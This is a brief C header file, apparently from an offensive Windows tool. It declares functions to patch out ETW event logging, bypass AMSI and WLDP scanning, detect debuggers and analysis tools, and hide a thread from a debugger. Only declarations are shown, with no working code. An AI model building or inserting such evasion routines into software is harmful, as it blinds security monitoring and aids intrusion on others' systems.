#pragma once
#include <windows.h>

/* Patch ETW — nop out EtwEventWrite */
void EtwPatcher(void);

/* Bypass AMSI — AmsiScanBuffer returns clean */
void AmsiBypass(void);

/* Bypass WLDP — WldpIsClassInApprovedList returns clean */
void WldpBypass(void);

/* Anti-analysis checks */
int  IsBeingDebugged(void);
int  DetectAnalysisTools(void);

/* Hide current thread from debugger (NtSetInformationProcess) */
void HideFromDebugger(void);